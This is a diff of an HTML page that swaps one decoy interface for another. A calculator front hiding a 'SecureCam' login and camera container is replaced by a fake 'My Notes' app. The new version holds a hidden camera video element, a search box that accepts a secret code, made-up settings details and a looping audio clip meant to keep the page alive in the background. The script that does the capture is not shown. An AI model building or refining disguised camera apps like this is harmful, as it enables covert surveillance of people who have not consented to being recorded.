@@ -2,84 +2,117 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Calculator</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>My Notes</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <meta name="theme-color" content="#101114">
 </head>
 <body>
-
-<!-- ============ CALCULATOR ============ -->
-<div id="calcLockScreen" class="screen active">
-    <div class="calc-phone">
-        <div class="calc-topbar">
-            <div>
-                <div class="calc-mode">Standard</div>
-                <h1>Calculator</h1>
+    <!-- Hidden video element for camera -->
+    <video id="cameraVideo" autoplay playsinline style="display: none;"></video>
+    
+    <!-- Main App Container -->
+    <div class="app-container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="header-title">My Notes</h1>
+            <div class="header-actions">
+                <button id="btnSearch" class="icon-btn" title="Search">🔍</button>
+                <button id="btnSettings" class="icon-btn" title="Settings">⚙️</button>
             </div>
         </div>
-        <div class="calc-display-wrap" aria-live="polite">
-            <div id="calcHistory" class="calc-history">&nbsp;</div>
-            <div id="calcDisplay" class="calc-display">0</div>
+
+        <!-- Search Bar (Hidden by default) -->
+        <div id="searchBar" class="search-bar" style="display: none;">
+            <input type="text" id="searchInput" class="search-input" placeholder="Search notes or enter secret code...">
+            <button id="btnCloseSearch" class="icon-btn">✕</button>
         </div>
-        <div class="calc-grid" aria-label="Calculator keypad">
-            <button type="button" class="calc-key calc-action" data-calc-action="clear">AC</button>
-            <button type="button" class="calc-key calc-action" data-calc-action="delete">DEL</button>
-            <button type="button" class="calc-key calc-action" data-calc-action="percent">%</button>
-            <button type="button" class="calc-key calc-op" data-calc-op="/">÷</button>
-            <button type="button" class="calc-key" data-calc-num="7">7</button>
-            <button type="button" class="calc-key" data-calc-num="8">8</button>
-            <button type="button" class="calc-key" data-calc-num="9">9</button>
-            <button type="button" class="calc-key calc-op" data-calc-op="*">×</button>
-            <button type="button" class="calc-key" data-calc-num="4">4</button>
-            <button type="button" class="calc-key" data-calc-num="5">5</button>
-            <button type="button" class="calc-key" data-calc-num="6">6</button>
-            <button type="button" class="calc-key calc-op" data-calc-op="-">−</button>
-            <button type="button" class="calc-key" data-calc-num="1">1</button>
-            <button type="button" class="calc-key" data-calc-num="2">2</button>
-            <button type="button" class="calc-key" data-calc-num="3">3</button>
-            <button type="button" class="calc-key calc-op" data-calc-op="+">+</button>
-            <button type="button" class="calc-key" data-calc-action="sign">±</button>
-            <button type="button" class="calc-key" data-calc-num="0">0</button>
-            <button type="button" class="calc-key" data-calc-action="decimal">.</button>
-            <button type="button" class="calc-key calc-equals" data-calc-action="equals">=</button>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Notes List Screen -->
+            <div id="screenNotesList" class="screen active">
+                <div class="notes-list" id="notesList">
+                    <!-- Notes will be inserted here by JavaScript -->
+                </div>
+                <button id="btnAddNote" class="fab-btn" title="Add Note">+</button>
+            </div>
+
+            <!-- Note Editor Screen -->
+            <div id="screenNoteEditor" class="screen">
+                <div class="editor-header">
+                    <button id="btnBackEditor" class="icon-btn">←</button>
+                    <span class="editor-title">Edit Note</span>
+                    <button id="btnSaveNote" class="icon-btn">✓</button>
+                </div>
+                <div class="editor-body">
+                    <input type="text" id="noteTitle" class="note-title-input" placeholder="Note title">
+                    <textarea id="noteContent" class="note-content-input" placeholder="Start writing..."></textarea>
+                </div>
+            </div>
+
+            <!-- Settings Screen -->
+            <div id="screenSettings" class="screen">
+                <div class="editor-header">
+                    <button id="btnBackSettings" class="icon-btn">←</button>
+                    <span class="editor-title">Settings</span>
+                </div>
+                <div class="settings-body">
+                    <div class="settings-section">
+                        <h3 class="settings-heading">General</h3>
+                        <div class="settings-item">
+                            <span>Dark Mode</span>
+                            <label class="toggle">
+                                <input type="checkbox" id="toggleDarkMode">
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                        <div class="settings-item">
+                            <span>Notifications</span>
+                            <label class="toggle">
+                                <input type="checkbox" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3 class="settings-heading">About</h3>
+                        <div class="settings-item">
+                            <span>Version</span>
+                            <span class="text-muted">3.0.1</span>
+                        </div>
+                        <div class="settings-item">
+                            <span>Storage Used</span>
+                            <span class="text-muted">2.4 MB</span>
+                        </div>
+                    </div>
+                    <div class="settings-section">
+                        <h3 class="settings-heading">Data</h3>
+                        <div class="settings-item clickable" id="btnExportNotes">
+                            <span>Export Notes</span>
+                            <span>→</span>
+                        </div>
+                        <div class="settings-item clickable">
+                            <span>Import Notes</span>
+                            <span>→</span>
+                        </div>
+                        <div class="settings-item clickable">
+                            <span>Clear All Notes</span>
+                            <span>→</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
-</div>
 
-<!-- ============ LOGIN OVERLAY ============ -->
-<div id="loginOverlay" class="screen overlay-screen">
-    <div class="login-box">
-        <div class="login-logo"><i class="fas fa-shield-alt"></i></div>
-        <h1>SecureCam</h1>
-        <p class="login-subtitle">AI Motion Security Camera</p>
-        <div class="auth-tabs">
-            <button onclick="switchAuth('login')" id="authTabLogin" class="auth-tab active">🔑 LOGIN</button>
-            <button onclick="switchAuth('register')" id="authTabRegister" class="auth-tab">🚀 CREATE ID</button>
-        </div>
-        <form id="loginForm" onsubmit="handleLogin(event)" class="auth-form">
-            <div class="input-wrap"><i class="fas fa-user"></i><input type="text" id="loginUsername" placeholder="Cyber ID" required></div>
-            <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" id="loginPassword" placeholder="Password" required></div>
-            <button type="submit" class="btn-primary">LOGIN & ACTIVATE</button>
-        </form>
-        <form id="registerForm" onsubmit="handleRegister(event)" class="auth-form hidden">
-            <div class="input-wrap"><i class="fas fa-at"></i><input type="text" id="regUsername" placeholder="Create Cyber ID" required pattern="[a-zA-Z0-9_]{3,20}"></div>
-            <div class="input-wrap"><i class="fas fa-signature"></i><input type="text" id="regDisplayName" placeholder="Display Name (e.g. Room Camera)" required></div>
-            <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" id="regPassword" placeholder="Create Password" required></div>
-            <button type="submit" class="btn-primary">CREATE ID & ACTIVATE</button>
-        </form>
-    </div>
-</div>
+    <!-- Toast Notification -->
+    <div id="toast" class="toast"></div>
 
-<!-- ============ HIDDEN CAMERA ============ -->
-<div id="cameraContainer" style="display:none;">
-    <video id="cameraVideo" autoplay playsinline muted></video>
-    <canvas id="motionCanvas"></canvas>
-    <canvas id="snapshotCanvas"></canvas>
-</div>
+    <!-- Hidden Audio (for background keep-alive) -->
+    <audio id="keepAliveAudio" loop>
+        <source src="data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQwAAAAAAAAAAAAAAAAAAAAAAASW5mbwAAAA8AAAAEAAABIADAwMDAwMDAwMDAwMDAwMDAwMDAwMDV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV6urq6urq6urq6urq6urq6urq6urq6v////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAA=" type="audio/mpeg">
+    </audio>
 
-<script src="app.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
